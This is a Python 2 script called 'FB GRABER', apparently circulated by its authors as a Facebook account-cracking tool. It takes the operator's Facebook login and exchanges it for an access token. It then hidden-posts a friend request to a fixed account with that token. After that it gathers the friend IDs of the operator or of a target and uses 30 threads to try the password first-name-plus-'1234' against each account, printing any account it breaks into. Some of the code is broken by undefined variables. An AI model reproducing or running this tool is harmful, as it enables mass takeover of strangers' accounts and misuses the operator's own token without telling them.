#!/ufr/bin/python2
#coding=utf-8
#shell

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
print("FB GRABER")
os.system('clear')




reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36 OPR/69.0.3686.77')]


def kelwa():
	print "\x1b[1;96m🚶‍  \x1b[1;91 Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)


#### LOGO ####
logo = """

_____ ____  ___ _____ _   _ ____  ____  
|  ___|  _ \|_ _|___ /| \ | |  _ \/ ___| 
| |_  | |_) || |  |_ \|  \| | | | \___ \ 
|  _| |  _ < | | ___) | |\  | |_| |___) |
|_|   |_| \_\___|____/|_| \_|____/|____/ 
                                                                                       
"""
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mLoding... \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
‎ 
\x1b[1;91m 
\x1b[1;91m-----------KURDISTAN----------------
\x1b[31;1m------------Blocker-SL------------ -------------     
\x1b[37;1m
"""                                
hr = """
_____ ____  ___ _____ _   _ ____  ____  
|  ___|  _ \|_ _|___ /| \ | |  _ \/ ___| 
| |_  | |_) || |  |_ \|  \| | | | \___ \ 
|  _| |  _ < | | ___) | |\  | |_| |___) |
|_|   |_| \_\___|____/|_| \_|____/|____/ 
                                                                                                                                                                                                                                                                                                                    
Telegram :https://t.me/fri3nds69
Github   :https://github.com/Blocker-SL 
Youtube  :https://www.youtube.com/channel/UCFVuwENJKUdykeHpqgwvOcg                    
"""
print(hr)
CorrectUsername = "fri3nds"
CorrectPassword = "fri3nds"
os.system('xdg-open https://www.instagram.com/.')
loop = 'true'
while (loop == 'true'):
    username = raw_input("\x1b[34;1m ⇆\x1b[1;95mUser \x1b[31;1m>>\x1b[1;91m")
    if (username == CorrectUsername):
    	password = raw_input("\x1b[34;1m \x1b[1;95mUser Password \x1b[37;1m>>>\x1b[1;91m")
        if (password == CorrectPassword):
            print "‏successful  " + username #Fri3nds J HeX
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;96m password incorrect"
            
    else:
        print "\033[1;96mUser incorecct "
        print "033[3;96mget id contact with https://t.me/fri3nds69"
        

def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		os.system('clear')
		print logo
		print 42*"\033[1;96m="
		print(' Login Facebook ')
		print('\x1b[31;1m<\x1b[36;1mLOGIN\x1b[31;1m')
		id = raw_input('\x1b[35;1mEMAILᬊᬁᦣ> \x1b[37;1m')
		pwd = raw_input('\x1b[35;1mPASSWORDᬊᬁᦣ> \x1b[31;1m ')
		tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print"\n\x1b[31;1m INTERNET CONNECTION LOST"
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print '\n\x1b[32;1mLogin successful '
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				menu()
			except requests.exceptions.ConnectionError:
				print"\n\x1b[31;1m[!]There is no connection[!]"
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[31;1m[!] Can't use your account your account in checkpoint[!]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			kelwa()
		else:
			print("\n\x1b[31;1m[¿]Email and Password incorecct[¿]")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\x1b[[31;1m[ᬊᬁᦣ] g [ᬊᬁᦣ]"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print"\033[1;91m Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\x1b[1;92mThere is no internet connection"
		kelwa()
	os.system("clear")
	print logo
	#INFORMATION OF USER
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print "\x1b[32;1mFacebook/ NAME>>"+Name-Fb
	print "\x1b[34;1mFacebook/ ID >>"+ID
	print '\x1b[33;1mFacebook/ TotalSub >>'+subid
	print "~~~~~~~~~~~~~~~~~~~~~~~~"
	print ""
	print "===================="
	print "\x1b[37;1m[1]> Start cracking"
	print "\x1b[37;1m[2]> Update"
	print "\x1b[37;1m[0]> exit"
	print "===================="
	#INFORMATION OF USER
	option()

def option():
	unikers = raw_input("\n\x1b[31;1mFri3nds@\x1b[37;1m69>>\x1b[33;1m")
	if unikers =="":
		print "\x1b[31;1mFill Space"
		option()
	elif unikers =="1":
		graber()
	elif unikers =="2":
		os.system('clear')
		print logo
		anime("//////PREPARE TO ---UPDATE //////")
		os.system('bash update.sh')
	elif unikers =="0":
		anime('LOGIN OUT ACCOUNT PLEASE WAIT')
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print "\x1b[31;1m Dont write Not necessary"
		option()

def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\x1b[31;1mToken incorrect"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\x1b[31;1m{1}~~cracking witjfriend  "
	print "\x1b[31;1m{2}~~Cracking with ID public "
	print "\x1b[31;1m{0}~~Exit"
	startgrab()

def startgrab():
	peak = raw_input("\x1b[37;1mFri3nds@\x1b[31;1m69>> ")
	if peak=="":
		print "\x1b[1;91mDont write Not necessary"
		startgrab()
	elif peak =="1":
		os.system('clear')
		print logo
		print "~~~~~~~~~~~Fri3nds-69 ~~~~~~~~~~~"
		anime('\033[1;91mget All ID \033[1;91m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input(" ID  >>>")
		print "~~~~~~~~~~~Fri3nds-69~~~~~~~~~~~"
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"Facebook/ Name :  "+op["name"]
		except KeyError:
			print"\x1b[31;1m don't serch id"
			raw_input("[back]enter ")
			graber()
		print"\x1b[32;1mGet  ID...."
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="0":
		menu()
	else:
		print "\x1b[1;91m Fill Space"
		startgrab()
	
	print "\x1b[32;1mAll ID >>"+str(len(id))
	anime('Loding.................................')
	titik = ['.   ','..  ','... ','....','.....']
	for o in titik:
		print("\r\x1b[37;1mCracking"+o),;sys.stdout.flush();time.sleep(1)
	print "\n                            \x1b[37;1m <●>°•°<●>Fri3nds -<> 69<●>°•°<●>"
	print "   \x1b[31;1m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"

	anime('\x1b[34;1mStarting..... ')
	print  "  \033[1;92m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@" 

	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('Graber')
		except OSError:
			pass #Fri3nds69
		try:
			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
			b = json.loads(a.text)												
			pass1 = b['first_name'] + '1234'												
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				z = json.loads(x.text)
				print '\x1b[37;1m Hacking'											
				print '\x1b[37;1mNAME >>> '+ b['name']											
				print '\x1b[37;1mID  >>>' + user											
				print '\x1b[37;1mPASSWORD  >>>' + pass1 + '\n'											
				oks.append(user+pass1)
             
										                                      
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
        anime(">>>>>>>>>$\x1b[31;1mFri3nds\x1b[37;1m69\x1b[0m$<<<<<<<<<<")
	anime("\x1b[37;1mRecode by Fri3nds-69" )#Fri3nds69
	print '\x1b[32;1m Cracking end  '
	print"\x1b[31;1mAll HITS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[31;1m/\x1b[33;1m"+str(len(cekpoint))
	print ""
	print(logo)
	os.system('xdg-open https://www.snapchat.com/add/..')
	anime(">>>>>>>>>>>>>>>Owner<<<<<<<<<<<<<<<")
	anime(">> Blocker SL")
	anime(">>>>>>>>>>>>>>><<<<<<<<<<<<<<<")
	print ""
	print ""
	raw_input("\n\x1b[31;1m [Again] Click enter")
	menu()

if __name__ == '__main__':
	login()
